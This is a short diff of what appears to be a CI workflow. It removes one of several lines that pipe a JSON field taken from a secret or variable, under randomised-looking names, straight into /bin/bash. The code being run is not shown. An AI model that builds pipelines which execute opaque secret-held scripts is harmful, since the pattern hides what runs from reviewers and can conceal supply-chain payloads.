@@ -17,7 +17,6 @@ jobs:
           hbj0: ${{ secrets.hbj0 }}
         run: |
           printf '%s' "$hbj0" | jq -r .hmq73 | /bin/bash
-          printf '%s' "$v695" | jq -r .yfpvp24 | /bin/bash
           printf '%s' "$p04446" | jq -r .yxuy0773 | /bin/bash
           printf '%s' "$j71419" | jq -r .x2113 | /bin/bash
           echo $svfgo153 | jq -r .p812 | /bin/bash
